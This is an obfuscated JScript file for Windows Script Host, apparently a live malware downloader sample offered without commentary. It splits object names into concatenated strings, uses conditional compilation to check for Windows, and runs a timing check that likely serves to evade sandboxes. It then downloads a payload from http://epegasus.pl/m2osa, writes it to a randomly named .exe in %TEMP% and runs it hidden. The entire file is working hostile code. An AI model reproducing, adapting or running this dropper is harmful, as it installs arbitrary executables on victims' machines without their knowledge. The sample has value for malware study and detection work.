var PS = false;
var I = "Create"+"Object";
var KW = function P() {return WScript[I]("WScript"+".Shell");}(), ED = 11;
var XJ = "MSXML2"+".XMLHTTP";
var A = 2;
var ZZ = A - 2;
function F(S){KW["Run"](S, ZZ, ZZ);};
function KR(){return XJ + "";};
function N(AW, IE){ZZ = ZZ * 1; return AW - IE;};
function AS(){return I;};
/*@cc_on
  @if (@_win32 || @_win64)
    PS = true;
  @end
@*/
if (PS)
{
var XP = "";
function GS(){return 22;};
var GO = 0; var J = 0;
function P0()
{
var MR = new this["Date"]();
var F0 = MR["getUTCMilliseconds"]();
WScript["Sleep"](GS());
var MR = new this["Date"]();
var QD = MR["getUTCMilliseconds"]();
WScript["Sleep"](GS());
var MR = new this["Date"]();
var NP = MR["getUTCMilliseconds"]();
var GO = "P1";
GO = N(QD, F0);
var J = "W";
J = N(NP, QD);
XP = "open";
return N(GO, J);
}
var A0 = false;
var M = false;
for (var Y = ZZ; Y < GS() * 1; Y++){if (P0() != ZZ){
A0 = true; 
J = "31" + 11 * GO + J; 
M = true; 
break;
}}
function R() {return ((A0 == true) && (A0 == M)) ? 1 : ZZ;};
if (A0 && R() && M){
function PX() {return KW["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "FGPXpwHANEtdkB9.ex" + "e";};
 KO = KR();
 E = WScript[I](KO);
 var U = 1;
do { 
	for (;U;){
	try {
		if (U == 1)
		{
			E[XP]("GET", "http://epegasus.pl/m2osa", false);
			E["send"]();
			JN = "Sleep";
			U = 2;
		}
		WScript[JN](GS() + 120); 
		if (E["readystate"] < 2 * 2) continue;
		U = ZZ;
		function B(DH) {var OO = (1, 2, 3, 4, 5, DH); return OO;};
		T = WScript[AS()]("ADODB.Stream");
		KO = T;
		KO[XP]();
		KO["type"] = B(1);
		KO["write"](E["ResponseBody"]);
		T["position"] = B(ZZ);
		KO["Save" + "ToFile"](PX(), 2);
		T["cl"+"ose"]();
		KX = PX();
		F(KX);
	} catch(R0){};};
}while (U);
}
}

